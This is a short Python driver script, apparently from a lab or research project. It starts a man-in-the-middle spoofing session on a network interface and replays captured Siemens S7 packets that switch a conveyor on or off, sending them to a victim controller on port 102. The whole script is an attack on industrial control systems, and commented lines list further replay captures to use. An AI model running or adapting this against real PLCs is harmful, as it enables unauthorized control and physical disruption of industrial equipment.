from Profinet_Master import *

if __name__ == '__main__':
    pcap_file = '/home/boris/PycharmProjects/Profinet_DanielV2/pcap/20160915_130300_replay_convayor_time_update.pcap'
    profinet_port = 102
    mitm = MITM_conf(interface='eno1', pkt_count="100", port=str(102))
    mitm.init_spoofing()
    victim = mitm.victim
    #client = Step7_Master_Replay(victim, profinet_port, pcap_file)
    #client = Step7_Master_Replay(victim, profinet_port, "./pcap/20160915_114800_replay_toggle_on_convayor_s7.pcap")
    client = Step7_Master_Replay(victim, profinet_port, "./pcap/20160915_114900_replay_toggle_off_convayor_s7.pcap")
    #client = Step7_Master_Replay(victim, profinet_port, "./pcap/Test 1 - Full Conveyor On Off (src).pcap")            #OLD
    #client = Step7_Master_Replay(victim, profinet_port,"./pcap/Test 3 - Direct Full Conveyor On Off (src).pcap")
    #client = Step7_Master_Replay(victim, profinet_port, "./pcap/Test 2.pcap")
    client.start()